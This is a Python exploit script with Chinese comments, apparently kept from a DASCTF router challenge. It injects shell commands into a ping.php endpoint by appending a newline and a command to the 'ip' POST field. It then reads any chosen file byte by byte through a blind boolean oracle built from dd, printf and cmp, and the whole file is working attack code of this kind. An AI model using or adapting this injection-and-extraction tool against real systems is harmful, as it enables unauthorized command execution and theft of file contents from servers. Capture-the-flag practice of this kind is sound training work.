# -*- coding: utf-8 -*-
"""
布尔盲注 RCE 逐字节提取引擎（2026-08-04 DASCTF 路由器题沉淀）
用法：
    python blind_rce_extract.py <ping.php地址> <目标文件> <读取长度>
示例：
    python blind_rce_extract.py https://靶机/ping.php /tmp/root.txt 100
前提（做题时先确认）：
    1. 换行 \\n 能绕过过滤执行命令（ip 值用 "127.0.0.1\\n命令"）
    2. 页面返回"成功/失败"= 命令退出码（布尔 oracle）
    3. /tmp 可写；dd / printf / cmp 可用
机关：
    dd 把文件第N字节剪到 /tmp/b
    printf 把猜的字符写到 /tmp/g
    cmp 比较两文件，相同=退出码0=成功=猜对
"""
import requests
import sys

def make_sender(url):
    def run(cmd):
        try:
            r = requests.post(url, data={"ip": "127.0.0.1\n" + cmd}, timeout=10)
            return "成功" in r.text
        except Exception:
            return False
    return run

# 候选字符：小写优先，其次数字，再其他（flag 一般小写+数字）
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789./_ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def extract(url, filepath, max_len):
    run = make_sender(url)
    # 先把目标文件拷贝到 /tmp（/tmp 可写）
    if not run(f"cat {filepath} > /tmp/x.txt"):
        print(f"[!] 无法拷贝 {filepath}（文件不存在或不可读？）")
        return
    print(f"[*] 开始提取 {filepath} ...")
    result = ""
    for pos in range(max_len):
        # 剪：取第 pos 个字节
        if not run(f"dd if=/tmp/x.txt bs=1 count=1 skip={pos} of=/tmp/b"):
            print(f"\n[!] 读位置 {pos} 失败，停止")
            break
        found = None
        for ch in CHARS:
            # 写猜测字符
            run(f"printf {ch} > /tmp/g")
            # 比对
            if run("cmp /tmp/b /tmp/g"):
                found = ch
                break
        result += found if found else "?"
        print("\r" + result, end="", flush=True)
    print("\n[完成]")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    url = sys.argv[1]
    filepath = sys.argv[2]
    length = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    extract(url, filepath, length)
    # 防闪退：Windows 双击运行完别闪关，按任意键退出
    print("\n按任意键退出...")
    try:
        input()
    except EOFError:
        pass
